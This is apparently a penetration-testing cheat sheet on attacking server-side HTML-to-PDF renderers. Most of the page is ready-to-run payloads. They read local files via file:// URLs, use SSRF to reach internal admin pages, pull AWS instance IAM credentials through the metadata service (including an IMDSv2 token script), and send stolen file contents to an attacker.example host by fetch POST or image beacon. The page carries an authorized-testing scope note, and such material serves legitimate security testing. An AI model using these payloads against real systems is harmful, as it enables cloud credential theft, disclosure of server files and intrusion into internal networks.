---
title: "HTML-to-PDF renderer abuse"
description: "Injected HTML and JavaScript in server-side PDF renderers read local files via file://, reach internal and cloud-metadata endpoints through SSRF, and exfiltrate the results."
keywords:
  - html to pdf
  - wkhtmltopdf
  - headless chrome
  - puppeteer
  - ssrf
  - file read
---

# PDF

Many applications generate PDFs by rendering an HTML template with a browser-grade engine: wkhtmltopdf, headless Chrome, or Puppeteer. When user input is placed into that HTML without encoding, the renderer executes attacker markup and script with the server's network position, giving local file reads, server-side request forgery, and exfiltration.

> **Scope.** For authorized penetration tests, red-team engagements, CTF labs, and code review of systems you own or are contracted to assess.

## The sink

A field is concatenated into the template that the renderer loads:

```html
<h1>Report for USERNAME_HERE</h1>
```

Inject HTML to confirm rendering, then escalate to script:

```html
<img src=x onerror="document.title='xss'">
<iframe src="file:///etc/passwd"></iframe>
```

## Local file read

The renderer runs with filesystem access, so `file://` URLs pull local files into the generated PDF. An iframe or object displays the contents directly:

```html
<iframe width="1000" height="1000" src="file:///etc/passwd"></iframe>
<object data="file:///var/www/app/config.php" width="1000" height="1000"></object>
```

In script-capable engines, read the file and place its text where it renders:

```html
<script>
fetch('file:///etc/passwd')
  .then(r => r.text())
  .then(t => { document.body.innerText = t; });
</script>
```

These `file://` reads work only when the renderer allows local file access. wkhtmltopdf 0.12.6 enables `--disable-local-file-access` by default, so this payload fires against an older build or a configuration that re-enabled it with `--enable-local-file-access`; headless Chrome and Puppeteer similarly gate `file://` behind flags. The SSRF paths below need no local-file access and work against default renderers.

## SSRF to internal and metadata endpoints

Because the fetch originates from the server, injected markup reaches hosts the attacker cannot touch directly. Pull an internal admin page or a cloud metadata endpoint into the PDF:

```html
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>
<img src="http://localhost:8080/admin/">
```

On cloud instances the metadata service yields instance credentials. For IMDSv2, the required token header needs script:

```html
<script>
fetch('http://169.254.169.254/latest/api/token',
  {method:'PUT', headers:{'X-aws-ec2-metadata-token-ttl-seconds':'60'}})
 .then(r => r.text())
 .then(tok => fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/role',
   {headers:{'X-aws-ec2-metadata-token':tok}}))
 .then(r => r.text())
 .then(d => { document.title = d; });
</script>
```

## Exfiltration

Rendering the stolen data into the PDF works when you receive the file, but blind contexts need an out-of-band channel. Have the injected script read a local or internal resource and POST it to your server:

```html
<script>
fetch('file:///etc/passwd')
  .then(r => r.text())
  .then(t => fetch('http://attacker.example/x', {method:'POST', body:t}));
</script>
```

An image or XHR beacon works where `fetch` is blocked:

```html
<script>
var x = new XMLHttpRequest();
x.open('GET','file:///etc/hostname',false); x.send();
new Image().src='http://attacker.example/?d='+encodeURIComponent(x.responseText);
</script>
```

## Engine notes

- **wkhtmltopdf**: strong `file://` and HTTP read support, limited JS; prefer `<iframe>`/`<object>` and `<img>` beacons.
- **Headless Chrome / Puppeteer**: full JavaScript, so `fetch`, `XMLHttpRequest`, and dynamic exfil all run; watch for `--disable-web-security` or missing `file://` restrictions.
- Delivery is through any field that lands in the template, firing server-side when the PDF is generated.

## References

- [OWASP: Server-Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PayloadsAllTheThings: Server Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
